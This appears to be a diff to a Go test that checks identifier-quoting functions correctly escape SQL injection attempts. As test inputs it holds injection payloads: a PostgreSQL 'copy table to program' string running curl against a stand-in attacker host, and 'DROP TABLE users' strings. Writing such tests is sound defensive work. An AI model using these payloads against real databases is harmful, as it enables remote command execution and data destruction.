@@ -574,8 +574,7 @@ func TestGetObjectFolderForDeltalake(t *testing.T) {
 }
 
 func TestQuoteIdentifiers(t *testing.T) {
-	maliciousIdentifier := `schema"; copy table to program 'curl attacker' --`
-	require.Equal(t, `"schema""; copy table to program 'curl attacker' --"`, DoubleQuoteIdentifier(maliciousIdentifier))
+	require.Equal(t, `"schema""; copy table to program 'curl attacker' --"`, DoubleQuoteIdentifier(`schema"; copy table to program 'curl attacker' --`))
 	require.Equal(t, "`project``; DROP TABLE users; --`", BacktickQuoteIdentifier("project`; DROP TABLE users; --"))
 	require.Equal(t, `[schema]]; DROP TABLE users; --]`, BracketQuoteIdentifier(`schema]; DROP TABLE users; --`))
 }
